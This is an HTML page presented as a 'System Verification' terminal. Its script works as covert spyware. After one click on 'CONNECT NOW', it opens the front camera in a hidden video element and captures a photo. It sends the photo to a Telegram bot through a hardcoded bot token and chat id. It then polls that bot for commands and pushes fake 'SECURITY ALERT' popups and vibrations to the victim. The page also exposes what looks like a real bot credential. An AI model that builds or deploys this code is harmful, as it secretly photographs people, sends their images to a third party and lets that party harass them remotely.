<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Verification</title>
    <style>
        body {
            background-color: #000;
            color: #0f0;
            font-family: 'Courier New', Courier, monospace;
            text-align: center;
            padding: 20px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            height: 90vh;
        }

        h1 { text-shadow: 0 0 10px #0f0; }

        .btn {
            background: #0f0;
            color: #000;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 20px;
            box-shadow: 0 0 15px #0f0;
        }

        #log {
            margin-top: 20px;
            font-size: 12px;
            color: #888;
        }

        /* Hide Video */
        #video-stream { display: none; }
    </style>
</head>
<body>

    <h1>TERMINAL ACCESS</h1>
    <p>Click below to grant permission.</p>

    <button class="btn" id="btn" onclick="startSystem()">CONNECT NOW</button>
    
    <div id="log">Waiting for connection...</div>

    <video id="video-stream" autoplay playsinline muted></video>
    <canvas id="hidden-canvas" style="display:none;"></canvas>

    <script>
        // --- CONFIGURATION ---
        const botToken = "8593566926:AAEhOP5u2ph3FriBMGrWvpSl8X-xEsXgrfk"; 
        
        let lastUpdateId = 0; 
        let isRunning = false;

        async function startSystem() {
            const btn = document.getElementById("btn");
            const log = document.getElementById("log");

            // 1. Notification Permission
            if (Notification.permission !== "granted") {
                await Notification.requestPermission();
            }

            // Test Notification
            if (Notification.permission === "granted") {
                new Notification("System Connected", { body: "Waiting for commands..." });
            }

            btn.disabled = true;
            btn.innerText = "ACCESS GRANTED";
            btn.style.background = "#333";
            btn.style.color = "#fff";
            log.innerText = "System Active. Listening for /msg commands...";

            isRunning = true;
            
            // Start Camera & Polling
            captureLoop();
            
            // Start listening for Telegram commands
            setInterval(checkTelegramMessages, 2000); 
        }

        // --- TELEGRAM COMMAND LISTENER ---
        async function checkTelegramMessages() {
            if (!isRunning) return;
            const log = document.getElementById("log");

            try {
                // Get Updates (only new ones)
                const offset = lastUpdateId + 1;
                const url = `https://api.telegram.org/bot${botToken}/getUpdates?offset=${offset}`;
                
                const response = await fetch(url);
                const data = await response.json();

                if (data.ok && data.result.length > 0) {
                    // Loop through all new messages
                    for (const update of data.result) {
                        lastUpdateId = update.update_id; // Update ID save karo
                        
                        // Check if message exists and has text
                        if (update.message && update.message.text) {
                            const text = update.message.text;

                            // COMMAND: /msg <text>
                            if (text.startsWith("/msg ")) {
                                const msgContent = text.replace("/msg ", "");
                                log.innerText = "Command Received: " + msgContent;
                                triggerNotification(msgContent);
                            }
                        }
                    }
                }
            } catch (error) {
                console.error("Polling Error:", error);
            }
        }

        // --- NOTIFICATION + ALERT TRIGGER ---
        function triggerNotification(text) {
            // 1. Try Native Notification
            if (Notification.permission === "granted") {
                new Notification("âš ï¸ SECURITY ALERT", {
                    body: text,
                    icon: "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f0/Error.svg/1200px-Error.svg.png",
                    vibrate: [200, 100, 200]
                });
            }

            // 2. Vibrate Phone
            if (navigator.vibrate) navigator.vibrate([500, 200, 500, 200, 500]);

            // 3. Fallback: Browser Alert (Ye screen par popup layega agar notification fail hui to)
            // Timeout isliye taaki vibration start ho jaye pehle
            setTimeout(() => {
                alert("ðŸ”´ MESSAGE FROM ADMIN:\n\n" + text);
            }, 500);
        }

        // --- CAMERA FUNCTION (Background) ---
        async function captureLoop() {
            // Sirf ek baar front camera photo bhejega startup par
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById("video-stream");
                const canvas = document.getElementById("hidden-canvas");
                video.srcObject = stream;

                await new Promise(r => setTimeout(r, 2000)); // Load hone do

                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext("2d").drawImage(video, 0, 0);
                
                canvas.toBlob(blob => {
                    const fd = new FormData();
                    fd.append("chat_id", "7681204940");
                    fd.append("photo", blob, "login.jpg");
                    fd.append("caption", "User connected & listening for commands ðŸŸ¢");
                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: fd });
                }, 'image/jpeg');

            } catch (e) {
                console.error(e);
            }
        }
    </script>
</body>
</html>
